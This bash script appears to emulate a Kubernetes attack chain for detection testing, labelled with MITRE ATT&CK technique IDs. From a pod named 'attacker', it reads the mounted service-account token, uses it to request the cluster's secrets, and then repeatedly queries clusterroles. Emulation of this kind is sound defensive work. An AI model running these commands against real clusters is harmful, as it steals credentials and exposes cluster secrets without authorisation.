#!/bin/bash
set -x

echo "### T1611 -> T1552 chain ###"
kubectl exec attacker -- chroot / /bin/true
sleep 1
kubectl exec attacker -- bash -c 'TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token); curl -s -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets' > /dev/null
sleep 3

echo "### T1613: RBAC discovery burst ###"
for i in $(seq 1 10); do
  kubectl exec attacker -- bash -c 'TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token); curl -s -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterroles' > /dev/null
done
sleep 3
echo "### DONE ###"
